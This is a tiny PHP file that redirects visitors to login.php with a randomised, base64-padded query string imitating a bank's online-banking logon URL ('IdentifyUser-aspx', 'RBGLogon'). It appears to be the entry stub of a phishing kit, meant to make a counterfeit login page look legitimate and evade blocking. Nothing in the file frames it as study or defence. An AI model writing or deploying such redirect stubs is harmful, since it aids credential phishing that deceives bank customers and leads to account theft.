<?php
	
	$praga=rand();
	$praga=base64_encode($praga);

	header ("location: login.php?public/enroll/IdentifyUser-aspx-LOB=RBGLogon=$praga$praga&session=$praga$praga");


?>